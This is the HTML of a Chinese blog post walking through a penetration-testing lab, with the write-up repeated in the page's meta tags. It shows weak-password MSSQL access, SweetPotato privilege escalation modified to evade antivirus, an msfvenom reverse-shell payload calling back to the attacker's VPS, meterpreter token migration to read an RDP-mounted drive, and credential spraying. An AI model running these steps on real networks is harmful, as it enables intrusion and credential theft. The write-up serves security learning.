@@ -1,0 +1,1607 @@
+<!DOCTYPE html>
+<html data-color-mode="light" data-dark-theme="dark" data-light-theme="light" lang="zh-CN">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="content-type" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link href='https://mirrors.sustech.edu.cn/cdnjs/ajax/libs/Primer/21.0.7/primer.css' rel='stylesheet' />
+    
+    <link rel="icon" href="https://avatars.githubusercontent.com/u/99706997?v=4"><script>
+        let theme = localStorage.getItem("meek_theme") || "light";
+        document.documentElement.setAttribute("data-color-mode", theme);
+    </script>
+<meta name="description" content="<html>
+<body>
+<!--StartFragment--><!-- obsidian --><h1 data-heading='外网'>外网</h1>
+<p>很简单的外网入口，也很流水线</p>
+<pre><code class='language-bash'>┌──(root㉿MJ)-[/tmp/test/yunjing]
+└─# fscan -h 39.99.226.61
+
+   ___                              _
+  / _ \     ___  ___ _ __ __ _  ___| | __
+ / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
+/ /_\\_____\__ \ (__| | | (_| | (__|   &#x3C;
+\____/     |___/\___|_|  \__,_|\___|_|\_\
+                     fscan version: 1.8.4
+start infoscan
+39.99.226.61:1433 open
+39.99.226.61:135 open
+39.99.226.61:80 open
+39.99.226.61:139 open
+[*] alive ports len is: 4
+start vulscan
+[*] NetInfo
+[*]39.99.226.61
+   [->]WIN-WEB
+   [->]172.22.8.18
+   [->]2001:0:14c9:d206:34cf:356:d89c:1dc2
+[*] WebTitle http://39.99.226.61       code:200 len:703    title:IIS Windows Server
+[+] mssql 39.99.226.61:1433:sa 1qaz!QAZ
+</code></pre>
+<p>sql server 弱密码，直接连上去拿shell就行了</p>
+
+<img width='1559' height='889' alt='Image' src='https://github.com/user-attachments/assets/6b37b918-84e5-4833-b32b-4a9f6fddeda1' />
+
+<pre><code class='language-cmd'>$ tasklist
+映像名称                       PID 会话名              会话#       内存使用 
+========================= ======== ================ =========== ============
+System Idle Process              0                            0          4 K
+System                           4                            0        136 K
+smss.exe                       244                            0      1,216 K
+csrss.exe                      336                            0      6,052 K
+wininit.exe                    412                            0      5,704 K
+csrss.exe                      420                            1      5,832 K
+winlogon.exe                   472                            1     13,764 K
+services.exe                   540                            0      7,820 K
+lsass.exe                      548                            0     17,184 K
+svchost.exe                    652                            0     19,536 K
+svchost.exe                    712                            0      9,560 K
+dwm.exe                        808                            1     30,348 K
+svchost.exe                    824                            0    303,368 K
+svchost.exe                    832                            0     56,504 K
+svchost.exe                    920                            0     21,956 K
+svchost.exe                    988                            0     24,740 K
+svchost.exe                    304                            0     16,440 K
+svchost.exe                    424                            0     20,484 K
+svchost.exe                   1040                            0     27,884 K
+svchost.exe                   1052                            0      7,432 K
+svchost.exe                   1200                            0     11,276 K
+svchost.exe                   1548                            0      6,916 K
+spoolsv.exe                   1608                            0     21,772 K
+svchost.exe                   1704                            0     10,720 K
+svchost.exe                   1824                            0      8,364 K
+svchost.exe                   1856                            0     18,152 K
+svchost.exe                   1872                            0     11,200 K
+svchost.exe                   1868                            0     11,624 K
+svchost.exe                   1884                            0     26,968 K
+sqlwriter.exe                 1892                            0      8,028 K
+svchost.exe                   1908                            0     17,904 K
+sqlceip.exe                   2824                            0     37,164 K
+sqlceip.exe                   2832                            0     54,124 K
+sqlservr.exe                  2840                            0    407,752 K
+sqlceip.exe                   2848                            0     50,232 K
+MsDtsSrvr.exe                 2856                            0     24,372 K
+ReportingServicesService.     2868                            0     87,036 K
+msmdsrv.exe                   3024                            0     52,516 K
+svchost.exe                   3228                            0      7,716 K
+Microsoft.ReportingServic     3880                            0     85,980 K
+conhost.exe                   3888                            0     10,732 K
+mpdwsvc.exe                   4204                            0    193,332 K
+mpdwsvc.exe                   4212                            0    328,096 K
+fdlauncher.exe                4496                            0      5,184 K
+fdhost.exe                    4520                            0      6,624 K
+conhost.exe                   4528                            0      9,024 K
+WmiPrvSE.exe                  4768                            0     15,760 K
+LogonUI.exe                   4928                            1     44,688 K
+TrustedInstaller.exe          4464                            0    237,084 K
+TiWorker.exe                  2028                            0    192,972 K
+WmiPrvSE.exe                  5280                            0      8,308 K
+AliYunDunUpdate.exe           5500                            0      9,648 K
+svchost.exe                   5704                            0     13,100 K
+WmiPrvSE.exe                  1904                            0      8,928 K
+aliyun_assist_service.exe     5636                            0     24,520 K
+w3wp.exe                      5768                            0     14,388 K
+csrss.exe                     5776                            2      5,832 K
+winlogon.exe                  5812                            2      8,140 K
+dwm.exe                       5624                            2     31,224 K
+rdpclip.exe                    480                            2     13,264 K
+RuntimeBroker.exe             2040                            2     22,316 K
+sihost.exe                    2592                            2     18,824 K
+svchost.exe                   2876                            2     18,812 K
+taskhostw.exe                 2924                            2     15,396 K
+ChsIME.exe                    5464                            2     16,324 K
+explorer.exe                  2432                            2     60,552 K
+ShellExperienceHost.exe       3896                            2     35,576 K
+SearchUI.exe                  1112                            2     36,652 K
+backgroundTaskHost.exe        6872                            2     23,948 K
+jusched.exe                   7016                            2      7,116 K
+AliYunDun.exe                 7112                            0     15,260 K
+argusagent_service.exe        7036                            0      8,388 K
+argusagent.exe                7048                            0      9,900 K
+conhost.exe                   6784                            0      7,292 K
+cmd.exe                       7088                            0      2,764 K
+argusagent.exe                2732                            0     80,580 K
+AliYunDunMonitor.exe          3384                            0     20,692 K
+msdtc.exe                     2692                            0     10,076 K
+cmd.exe                       2632                            0      2,772 K
+conhost.exe                   6484                            0      9,660 K
+tasklist.exe                  7040                            0      7,824 K
+</code></pre>
+<p>重点可以看到阿里云盾，土豆得过一下免杀，不过免杀的土豆，总是没法指定参数，所以自己写死加个管理员编译免杀就行</p>
+<pre><code class='language-cmd'>$ C:\Users\Public\error.exe
+SweetPotato by @_EthicalChaos_
+  Orignal RottenPotato code and exploit by @foxglovesec
+  Weaponized JuciyPotato by @decoder_it and @Guitro along with BITS WinRM discovery
+  PrintSpoofer discovery and original exploit by @itm4n
+  EfsRpc built on EfsPotato by @zcgonvh and PetitPotam by @topotam
+[+] Attempting NP impersonation using method PrintSpoofer to launch c:\Windows\System32\cmd.exe
+[+] Triggering notification on evil PIPE \\WIN-WEB/pipe/b67b39f2-87cf-4c56-8e73-c092f93fc69c
+[+] Server connected to our evil RPC pipe
+[+] Duplicated impersonation token ready for process creation
+[+] Intercepted and authenticated successfully, launching program
+[+] Process created, enjoy!
+</code></pre>
+<p>rdp上去就行了</p>
+<h1 data-heading='内网'>内网</h1>
+<p>上线一下vshell搭个隧道，这里我fscan扫一下没什么能进去的服务，就大概猜到开始域渗透了，毕竟是刚入门，跟着wp打了</p>
+
+IP | 主机名 | 域 | 操作系统 | 关键信息 |   |  
+-- | -- | -- | -- | -- | -- | --
+172.22.8.15 | DC01 | xiaorang.lab | Windows Server 2022 / Build 10.0.20348 | 疑似域控，开放 DNS、LDAP、RDP、SMB、RPC 等 |   |  
+172.22.8.31 | WIN19-CLIENT | xiaorang.lab | Windows Server 2019 / Windows 10 Build 17763 | 开放 RDP、SMB、RPC 等 |   |  
+172.22.8.46 | WIN2016 | xiaorang.lab | Windows 10 1607 / Windows Server 2016 Build 14393 | 开放 IIS、RDP、SMB、RPC 等 |   |  
+
+
+<p>生成个马子</p>
+<pre><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=vpsip LPORT=9999 -f exe -o msf.exe
+</code></pre>
+<pre><code>msf > use exploit/multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
+payload => windows/x64/meterpreter/reverse_tcp
+msf exploit(multi/handler) > set lhost vps
+msf exploit(multi/handler) > set lport 10002
+lport => 10002
+msf exploit(multi/handler) > run
+[*] Started reverse TCP handler on 0.0.0.0:10002
+</code></pre>
+<p>这里看大佬们讲是Tsclient，默认rdp连接远程机时不会挂载本地机的任何盘符，这里john rdp连我们控的这台机器，设置了挂载它本地的c盘，所以迁移到john用户可以读到31的盘</p>
+<p>下面这几个命令就能明显显示出来为什么以john身份登录还是看不到挂载的盘，涉及到进程迁移，找到john的进程迁移过去然后以john令牌开shell就行了，这里我看文章都没有讲，大概是自己刚入门win这方面</p>
+<pre><code>meterpreter > shell
+Process 1616 created.
+Channel 14 created.
+Microsoft Windows [�汾 10.0.14393]
+(c) 2016 Microsoft Corporation����������Ȩ����
+
+C:\Windows\system32>chcp 65001
+chcp 65001
+Active code page: 65001
+
+C:\Windows\system32>whoami
+whoami
+win-web\john
+
+C:\Windows\system32>net use
+net use
+New connections will be remembered.
+
+There are no entries in the list.
+
+
+C:\Windows\system32>dir \\tsclient\C
+dir \\tsclient\C
+The network name cannot be found.
+
+C:\Windows\system32>dir \\tsclient\C$
+dir \\tsclient\C$
+The network name cannot be found.
+
+C:\Windows\system32>quser
+quser
+ USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
+ john                  rdp-tcp#0           2  Active         25  2026/9/10 8:58
+>mj                    rdp-tcp#6           3  Active          2  2026/9/10 9:05
+
+C:\Windows\system32>exit
+exit
+meterpreter > ps
+
+Process List
+============
+
+ PID   PPID  Name               Arch  Session  User                           Path
+ ---   ----  ----               ----  -------  ----                           ----
+ 0     0     [System Process]
+ 4     0     System             x64   0
+ 244   4     smss.exe           x64   0
+ 304   540   svchost.exe        x64   0
+ 336   328   csrss.exe
+ 344   652   ChsIME.exe
+ 412   328   wininit.exe        x64   0
+ 420   404   csrss.exe
+ 424   540   svchost.exe        x64   0
+ 472   404   winlogon.exe       x64   1
+ 480   832   rdpclip.exe        x64   2        WIN-WEB\John                   C:\Windows\System32\rdpclip.e
+                                                                              xe
+ 540   412   services.exe       x64   0
+ 548   412   lsass.exe          x64   0
+ 652   540   svchost.exe        x64   0
+ 712   540   svchost.exe        x64   0
+ 784   652   SearchUI.exe
+ 808   472   dwm.exe
+ 824   540   svchost.exe        x64   0
+ 832   540   svchost.exe        x64   0
+ 920   540   svchost.exe        x64   0
+ 988   540   svchost.exe        x64   0
+ 1040  540   svchost.exe        x64   0
+ 1052  540   svchost.exe        x64   0
+ 1112  652   SearchUI.exe       x64   2        WIN-WEB\John                   C:\Windows\SystemApps\Microso
+                                                                              ft.Windows.Cortana_cw5n1h2txy
+                                                                              ewy\SearchUI.exe
+ 1420  3076  dwm.exe
+ 1548  540   svchost.exe        x64   0
+ 1608  540   spoolsv.exe        x64   0
+ 1704  540   svchost.exe        x64   0
+ 1712  652   ShellExperienceHo
+             st.exe
+ 1824  540   svchost.exe        x64   0
+ 1856  540   svchost.exe        x86   0
+ 1868  540   svchost.exe        x64   0
+ 1872  540   svchost.exe        x64   0
+ 1884  540   svchost.exe        x64   0
+ 1892  540   sqlwriter.exe      x64   0
+ 1908  540   svchost.exe        x64   0
+ 2012  824   sihost.exe
+ 2040  652   RuntimeBroker.exe  x64   2        WIN-WEB\John                   C:\Windows\System32\RuntimeBr
+                                                                              oker.exe
+ 2432  5268  explorer.exe       x64   2        WIN-WEB\John                   C:\Windows\explorer.exe
+ 2592  824   sihost.exe         x64   2        WIN-WEB\John                   C:\Windows\System32\sihost.ex
+                                                                              e
+ 2692  540   msdtc.exe          x64   0
+ 2732  7088  argusagent.exe     x64   0
+ 2824  540   sqlceip.exe        x64   0        NT SERVICE\SSISTELEMETRY130
+ 2832  540   sqlceip.exe        x64   0        NT SERVICE\SSASTELEMETRY
+ 2840  540   sqlservr.exe       x64   0        NT SERVICE\MSSQLSERVER
+ 2848  540   sqlceip.exe        x64   0        NT SERVICE\SQLTELEMETRY
+ 2856  540   MsDtsSrvr.exe      x64   0        NT SERVICE\MsDtsServer130
+ 2868  540   ReportingServices  x64   0        NT SERVICE\ReportServer
+             Service.exe
+ 2876  540   svchost.exe        x64   2        WIN-WEB\John                   C:\Windows\System32\svchost.e
+                                                                              xe
+ 2924  824   taskhostw.exe      x64   2        WIN-WEB\John                   C:\Windows\System32\taskhostw
+                                                                              .exe
+ 3024  540   msmdsrv.exe        x64   0        NT SERVICE\MSSQLServerOLAPSer
+                                               vice
+ 3076  2864  winlogon.exe       x64   3
+ 3384  7112  AliYunDunMonitor.  x86   0
+             exe
+ 3520  540   svchost.exe        x64   0
+ 3784  7016  jucheck.exe        x86   2        WIN-WEB\John                   C:\Program Files (x86)\Common
+                                                                               Files\Java\Java Update\juche
+                                                                              ck.exe
+ 3880  2868  Microsoft.Reporti
+             ngServices.Portal
+             .WebHost.exe
+ 3888  3880  conhost.exe
+ 3896  652   ShellExperienceHo  x64   2        WIN-WEB\John                   C:\Windows\SystemApps\ShellEx
+             st.exe                                                           perienceHost_cw5n1h2txyewy\Sh
+                                                                              ellExperienceHost.exe
+ 4204  540   mpdwsvc.exe        x64   0
+ 4212  540   mpdwsvc.exe        x64   0
+ 4496  540   fdlauncher.exe     x64   0        NT SERVICE\MSSQLFDLauncher
+ 4520  4496  fdhost.exe         x64   0        NT SERVICE\MSSQLFDLauncher     C:\Program Files\Microsoft SQ
+                                                                              L Server\MSSQL13.MSSQLSERVER\
+                                                                              MSSQL\Binn\fdhost.exe
+ 4528  4520  conhost.exe
+ 4532  8104  e22b16cetcp.exe    x64   3        WIN-WEB\mj                     C:\Users\Public\e22b16cetcp.e
+                                                                              xe
+ 4768  652   WmiPrvSE.exe
+ 4832  832   rdpclip.exe
+ 4876  652   RuntimeBroker.exe
+ 4900  2864  csrss.exe
+ 4928  472   LogonUI.exe        x64   1
+ 4988  8132  jucheck.exe
+ 5004  5228  explorer.exe
+ 5280  652   WmiPrvSE.exe
+ 5464  652   ChsIME.exe         x64   2        WIN-WEB\John                   C:\Windows\System32\InputMeth
+                                                                              od\CHS\ChsIME.exe
+ 5500  540   AliYunDunUpdate.e  x86   0
+             xe
+ 5564  5004  msf.exe            x64   3        WIN-WEB\mj                     C:\msf.exe
+ 5624  5812  dwm.exe
+ 5636  540   aliyun_assist_ser  x64   0
+             vice.exe
+ 5768  1868  w3wp.exe           x64   0        IIS APPPOOL\DefaultAppPool     C:\Windows\System32\inetsrv\w
+                                                                              3wp.exe
+ 5776  5984  csrss.exe
+ 5812  5984  winlogon.exe       x64   2
+ 5860  8104  conhost.exe        x64   3        WIN-WEB\mj                     C:\Windows\System32\conhost.e
+                                                                              xe
+ 5868  652   WmiPrvSE.exe
+ 6248  824   taskhostw.exe
+ 6604  540   svchost.exe        x64   3        WIN-WEB\mj
+ 6712  540   svchost.exe        x64   0
+ 6784  7048  conhost.exe        x64   0
+ 6864  824   taskhostw.exe      x64   2        WIN-WEB\John                   C:\Windows\System32\taskhostw
+                                                                              .exe
+ 7016  6972  jusched.exe        x86   2        WIN-WEB\John                   C:\Program Files (x86)\Common
+                                                                               Files\Java\Java Update\jusch
+                                                                              ed.exe
+ 7036  540   argusagent_servic  x64   0
+             e.exe
+ 7048  6464  argusagent.exe     x64   0
+ 7088  7048  cmd.exe            x64   0
+ 7112  540   AliYunDun.exe      x86   0
+ 7296  540   svchost.exe        x64   0
+ 7628  824   taskhostw.exe      x64   3        WIN-WEB\mj                     C:\Windows\System32\taskhostw
+                                                                              .exe
+ 7908  652   dllhost.exe
+ 8056  652   ChsIME.exe
+ 8104  4876  cmd.exe            x64   3        WIN-WEB\mj                     C:\Windows\System32\cmd.exe
+ 8132  8096  jusched.exe
+
+meterpreter > migrate 7016
+[*] Migrating from 5564 to 7016...
+[*] Migration completed successfully.
+meterpreter > shell
+Process 6868 created.
+Channel 1 created.
+Microsoft Windows [�汾 10.0.14393]
+(c) 2016 Microsoft Corporation����������Ȩ����
+
+C:\Windows\SysWOW64>chcp 65001
+chcp 65001
+Active code page: 65001
+
+C:\Windows\SysWOW64>whoami
+whoami
+win-web\john
+
+C:\Windows\SysWOW64>quesr
+quesr
+'quesr' is not recognized as an internal or external command,
+operable program or batch file.
+
+C:\Windows\SysWOW64>quser
+quser
+ USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
+>john                  rdp-tcp#0           2  Active         26  2026/9/10 8:58
+ mj                    rdp-tcp#6           3  Active          3  2026/9/10 9:05
+
+C:\Windows\SysWOW64>net use
+net use
+New connections will be remembered.
+
+
+Status       Local     Remote                    Network
+
+-------------------------------------------------------------------------------
+                       \\TSCLIENT\C              Microsoft Terminal Services
+The command completed successfully.
+</code></pre>
+<p>读到凭据和hint</p>
+<pre><code>C:\Windows\SysWOW64>type \\TSCLIENT\C\*.txt
+type \\TSCLIENT\C\*.txt
+
+\\TSCLIENT\C\credential.txt
+
+
+xiaorang.lab\Aldrich:Ald@rLMWuy7Z!#
+
+Do you know how to hijack Image?
+</code></pre>
+<p>域内就这几台机器撞一下密码看看哪个能登上去</p>
+<pre><code class='language-bash'>┌──(root㉿MJ)-[/tmp/test/yunjing]
+└─# pc crackmapexec smb 172.22.8.15 172.22.8.31 172.22.8.46 -u 'Aldrich' -p 'Ald@rLMWuy7Z!#'
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+[proxychains] Strict chain  ...  211.159.175.21:10001 [proxychains] Strict chain  ...  211.159.175.21:10001 [proxychains] Strict chain  ...  211.159.175.21:10001  ...  172.22.8.15:445  ...  172.22.8.46:445  ...  172.22.8.31:445  ...  OK
+ ...  OK
+ ...  OK
+[proxychains] Strict chain  ...  211.159.175.21:10001 [proxychains] Strict chain  ...  211.159.175.21:10001  ...  172.22.8.15:445  ...  172.22.8.31:445 [proxychains] Strict chain  ...  211.159.175.21:10001  ...  OK
+ ...  172.22.8.46:135  ...  OK
+ ...  OK
+[proxychains] Strict chain  ...  211.159.175.21:10001 SMB         172.22.8.46     445    WIN2016          [*] Windows Server 2016 Datacenter 14393 x64 (name:WIN2016) (domain:xiaorang.lab) (signing:False) (SMBv1:True)
+[proxychains] Strict chain  ...  211.159.175.21:10001 [proxychains] Strict chain  ...  211.159.175.21:10001  ...  172.22.8.15:135  ...  172.22.8.46:445  ...  172.22.8.31:135  ...  OK
+ ...  OK
+ ...  OK
+SMB         172.22.8.15     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:xiaorang.lab) (signing:True) (SMBv1:False)
+SMB         172.22.8.31     445    WIN19-CLIENT     [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN19-CLIENT) (domain:xiaorang.lab) (signing:False) (SMBv1:False)
+SMB         172.22.8.46     445    WIN2016          [-] xiaorang.lab\Aldrich:Ald@rLMWuy7Z!# STATUS_PASSWORD_EXPIRED
+[proxychains] Strict chain  ...  211.159.175.21:10001  ...  172.22.8.15:445  ...  OK
+[proxychains] Strict chain  ...  211.159.175.21:10001  ...  172.22.8.15:445  ...  OK
+SMB         172.22.8.15     445    DC01             [-] xiaorang.lab\Aldrich:Ald@rLMWuy7Z!# STATUS_PASSWORD_EXPIRED
+[proxychains] Strict chain  ...  211.159.175.21:10001  ...  172.22.8.31:445  ...  OK
+[proxychains] Strict chain  ...  211.159.175.21:10001  ...  172.22.8.31:445  ...  OK
+SMB         172.22.8.31     445    WIN19-CLIENT     [-] xiaorang.lab\Aldrich:Ald@rLMWuy7Z!# STATUS_PASSWORD_EXPIRE
+</code></pre>
+<p>紫色代表密码过期登上去需要修改一下,不过DC还是上不去的，我上了46</p>
+<pre><code>C:\Users\Aldrich>net group 'Domain Admins' /domain
+这项请求将在域 xiaorang.lab 的域控制器处理。">
+<meta property="og:title" content="Tsclient">
+<meta property="og:description" content="<html>
+<body>
+<!--StartFragment--><!-- obsidian --><h1 data-heading='外网'>外网</h1>
+<p>很简单的外网入口，也很流水线</p>
+<pre><code class='language-bash'>┌──(root㉿MJ)-[/tmp/test/yunjing]
+└─# fscan -h 39.99.226.61
+
+   ___                              _
+  / _ \     ___  ___ _ __ __ _  ___| | __
+ / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
+/ /_\\_____\__ \ (__| | | (_| | (__|   &#x3C;
+\____/     |___/\___|_|  \__,_|\___|_|\_\
+                     fscan version: 1.8.4
+start infoscan
+39.99.226.61:1433 open
+39.99.226.61:135 open
+39.99.226.61:80 open
+39.99.226.61:139 open
+[*] alive ports len is: 4
+start vulscan
+[*] NetInfo
+[*]39.99.226.61
+   [->]WIN-WEB
+   [->]172.22.8.18
+   [->]2001:0:14c9:d206:34cf:356:d89c:1dc2
+[*] WebTitle http://39.99.226.61       code:200 len:703    title:IIS Windows Server
+[+] mssql 39.99.226.61:1433:sa 1qaz!QAZ
+</code></pre>
+<p>sql server 弱密码，直接连上去拿shell就行了</p>
+
+<img width='1559' height='889' alt='Image' src='https://github.com/user-attachments/assets/6b37b918-84e5-4833-b32b-4a9f6fddeda1' />
+
+<pre><code class='language-cmd'>$ tasklist
+映像名称                       PID 会话名              会话#       内存使用 
+========================= ======== ================ =========== ============
+System Idle Process              0                            0          4 K
+System                           4                            0        136 K
+smss.exe                       244                            0      1,216 K
+csrss.exe                      336                            0      6,052 K
+wininit.exe                    412                            0      5,704 K
+csrss.exe                      420                            1      5,832 K
+winlogon.exe                   472                            1     13,764 K
+services.exe                   540                            0      7,820 K
+lsass.exe                      548                            0     17,184 K
+svchost.exe                    652                            0     19,536 K
+svchost.exe                    712                            0      9,560 K
+dwm.exe                        808                            1     30,348 K
+svchost.exe                    824                            0    303,368 K
+svchost.exe                    832                            0     56,504 K
+svchost.exe                    920                            0     21,956 K
+svchost.exe                    988                            0     24,740 K
+svchost.exe                    304                            0     16,440 K
+svchost.exe                    424                            0     20,484 K
+svchost.exe                   1040                            0     27,884 K
+svchost.exe                   1052                            0      7,432 K
+svchost.exe                   1200                            0     11,276 K
+svchost.exe                   1548                            0      6,916 K
+spoolsv.exe                   1608                            0     21,772 K
+svchost.exe                   1704                            0     10,720 K
+svchost.exe                   1824                            0      8,364 K
+svchost.exe                   1856                            0     18,152 K
+svchost.exe                   1872                            0     11,200 K
+svchost.exe                   1868                            0     11,624 K
+svchost.exe                   1884                            0     26,968 K
+sqlwriter.exe                 1892                            0      8,028 K
+svchost.exe                   1908                            0     17,904 K
+sqlceip.exe                   2824                            0     37,164 K
+sqlceip.exe                   2832                            0     54,124 K
+sqlservr.exe                  2840                            0    407,752 K
+sqlceip.exe                   2848                            0     50,232 K
+MsDtsSrvr.exe                 2856                            0     24,372 K
+ReportingServicesService.     2868                            0     87,036 K
+msmdsrv.exe                   3024                            0     52,516 K
+svchost.exe                   3228                            0      7,716 K
+Microsoft.ReportingServic     3880                            0     85,980 K
+conhost.exe                   3888                            0     10,732 K
+mpdwsvc.exe                   4204                            0    193,332 K
+mpdwsvc.exe                   4212                            0    328,096 K
+fdlauncher.exe                4496                            0      5,184 K
+fdhost.exe                    4520                            0      6,624 K
+conhost.exe                   4528                            0      9,024 K
+WmiPrvSE.exe                  4768                            0     15,760 K
+LogonUI.exe                   4928                            1     44,688 K
+TrustedInstaller.exe          4464                            0    237,084 K
+TiWorker.exe                  2028                            0    192,972 K
+WmiPrvSE.exe                  5280                            0      8,308 K
+AliYunDunUpdate.exe           5500                            0      9,648 K
+svchost.exe                   5704                            0     13,100 K
+WmiPrvSE.exe                  1904                            0      8,928 K
+aliyun_assist_service.exe     5636                            0     24,520 K
+w3wp.exe                      5768                            0     14,388 K
+csrss.exe                     5776                            2      5,832 K
+winlogon.exe                  5812                            2      8,140 K
+dwm.exe                       5624                            2     31,224 K
+rdpclip.exe                    480                            2     13,264 K
+RuntimeBroker.exe             2040                            2     22,316 K
+sihost.exe                    2592                            2     18,824 K
+svchost.exe                   2876                            2     18,812 K
+taskhostw.exe                 2924                            2     15,396 K
+ChsIME.exe                    5464                            2     16,324 K
+explorer.exe                  2432                            2     60,552 K
+ShellExperienceHost.exe       3896                            2     35,576 K
+SearchUI.exe                  1112                            2     36,652 K
+backgroundTaskHost.exe        6872                            2     23,948 K
+jusched.exe                   7016                            2      7,116 K
+AliYunDun.exe                 7112                            0     15,260 K
+argusagent_service.exe        7036                            0      8,388 K
+argusagent.exe                7048                            0      9,900 K
+conhost.exe                   6784                            0      7,292 K
+cmd.exe                       7088                            0      2,764 K
+argusagent.exe                2732                            0     80,580 K
+AliYunDunMonitor.exe          3384                            0     20,692 K
+msdtc.exe                     2692                            0     10,076 K
+cmd.exe                       2632                            0      2,772 K
+conhost.exe                   6484                            0      9,660 K
+tasklist.exe                  7040                            0      7,824 K
+</code></pre>
+<p>重点可以看到阿里云盾，土豆得过一下免杀，不过免杀的土豆，总是没法指定参数，所以自己写死加个管理员编译免杀就行</p>
+<pre><code class='language-cmd'>$ C:\Users\Public\error.exe
+SweetPotato by @_EthicalChaos_
+  Orignal RottenPotato code and exploit by @foxglovesec
+  Weaponized JuciyPotato by @decoder_it and @Guitro along with BITS WinRM discovery
+  PrintSpoofer discovery and original exploit by @itm4n
+  EfsRpc built on EfsPotato by @zcgonvh and PetitPotam by @topotam
+[+] Attempting NP impersonation using method PrintSpoofer to launch c:\Windows\System32\cmd.exe
+[+] Triggering notification on evil PIPE \\WIN-WEB/pipe/b67b39f2-87cf-4c56-8e73-c092f93fc69c
+[+] Server connected to our evil RPC pipe
+[+] Duplicated impersonation token ready for process creation
+[+] Intercepted and authenticated successfully, launching program
+[+] Process created, enjoy!
+</code></pre>
+<p>rdp上去就行了</p>
+<h1 data-heading='内网'>内网</h1>
+<p>上线一下vshell搭个隧道，这里我fscan扫一下没什么能进去的服务，就大概猜到开始域渗透了，毕竟是刚入门，跟着wp打了</p>
+
+IP | 主机名 | 域 | 操作系统 | 关键信息 |   |  
+-- | -- | -- | -- | -- | -- | --
+172.22.8.15 | DC01 | xiaorang.lab | Windows Server 2022 / Build 10.0.20348 | 疑似域控，开放 DNS、LDAP、RDP、SMB、RPC 等 |   |  
+172.22.8.31 | WIN19-CLIENT | xiaorang.lab | Windows Server 2019 / Windows 10 Build 17763 | 开放 RDP、SMB、RPC 等 |   |  
+172.22.8.46 | WIN2016 | xiaorang.lab | Windows 10 1607 / Windows Server 2016 Build 14393 | 开放 IIS、RDP、SMB、RPC 等 |   |  
+
+
+<p>生成个马子</p>
+<pre><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=vpsip LPORT=9999 -f exe -o msf.exe
+</code></pre>
+<pre><code>msf > use exploit/multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
+payload => windows/x64/meterpreter/reverse_tcp
+msf exploit(multi/handler) > set lhost vps
+msf exploit(multi/handler) > set lport 10002
+lport => 10002
+msf exploit(multi/handler) > run
+[*] Started reverse TCP handler on 0.0.0.0:10002
+</code></pre>
+<p>这里看大佬们讲是Tsclient，默认rdp连接远程机时不会挂载本地机的任何盘符，这里john rdp连我们控的这台机器，设置了挂载它本地的c盘，所以迁移到john用户可以读到31的盘</p>
+<p>下面这几个命令就能明显显示出来为什么以john身份登录还是看不到挂载的盘，涉及到进程迁移，找到john的进程迁移过去然后以john令牌开shell就行了，这里我看文章都没有讲，大概是自己刚入门win这方面</p>
+<pre><code>meterpreter > shell
+Process 1616 created.
+Channel 14 created.
+Microsoft Windows [�汾 10.0.14393]
+(c) 2016 Microsoft Corporation����������Ȩ����
+
+C:\Windows\system32>chcp 65001
+chcp 65001
+Active code page: 65001
+
+C:\Windows\system32>whoami
+whoami
+win-web\john
+
+C:\Windows\system32>net use
+net use
+New connections will be remembered.
+
+There are no entries in the list.
+
+
+C:\Windows\system32>dir \\tsclient\C
+dir \\tsclient\C
+The network name cannot be found.
+
+C:\Windows\system32>dir \\tsclient\C$
+dir \\tsclient\C$
+The network name cannot be found.
+
+C:\Windows\system32>quser
+quser
+ USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
+ john                  rdp-tcp#0           2  Active         25  2026/9/10 8:58
+>mj                    rdp-tcp#6           3  Active          2  2026/9/10 9:05
+
+C:\Windows\system32>exit
+exit
+meterpreter > ps
+
+Process List
+============
+
+ PID   PPID  Name               Arch  Session  User                           Path
+ ---   ----  ----               ----  -------  ----                           ----
+ 0     0     [System Process]
+ 4     0     System             x64   0
+ 244   4     smss.exe           x64   0
+ 304   540   svchost.exe        x64   0
+ 336   328   csrss.exe
+ 344   652   ChsIME.exe
+ 412   328   wininit.exe        x64   0
+ 420   404   csrss.exe
+ 424   540   svchost.exe        x64   0
+ 472   404   winlogon.exe       x64   1
+ 480   832   rdpclip.exe        x64   2        WIN-WEB\John                   C:\Windows\System32\rdpclip.e
+                                                                              xe
+ 540   412   services.exe       x64   0
+ 548   412   lsass.exe          x64   0
+ 652   540   svchost.exe        x64   0
+ 712   540   svchost.exe        x64   0
+ 784   652   SearchUI.exe
+ 808   472   dwm.exe
+ 824   540   svchost.exe        x64   0
+ 832   540   svchost.exe        x64   0
+ 920   540   svchost.exe        x64   0
+ 988   540   svchost.exe        x64   0
+ 1040  540   svchost.exe        x64   0
+ 1052  540   svchost.exe        x64   0
+ 1112  652   SearchUI.exe       x64   2        WIN-WEB\John                   C:\Windows\SystemApps\Microso
+                                                                              ft.Windows.Cortana_cw5n1h2txy
+                                                                              ewy\SearchUI.exe
+ 1420  3076  dwm.exe
+ 1548  540   svchost.exe        x64   0
+ 1608  540   spoolsv.exe        x64   0
+ 1704  540   svchost.exe        x64   0
+ 1712  652   ShellExperienceHo
+             st.exe
+ 1824  540   svchost.exe        x64   0
+ 1856  540   svchost.exe        x86   0
+ 1868  540   svchost.exe        x64   0
+ 1872  540   svchost.exe        x64   0
+ 1884  540   svchost.exe        x64   0
+ 1892  540   sqlwriter.exe      x64   0
+ 1908  540   svchost.exe        x64   0
+ 2012  824   sihost.exe
+ 2040  652   RuntimeBroker.exe  x64   2        WIN-WEB\John                   C:\Windows\System32\RuntimeBr
+                                                                              oker.exe
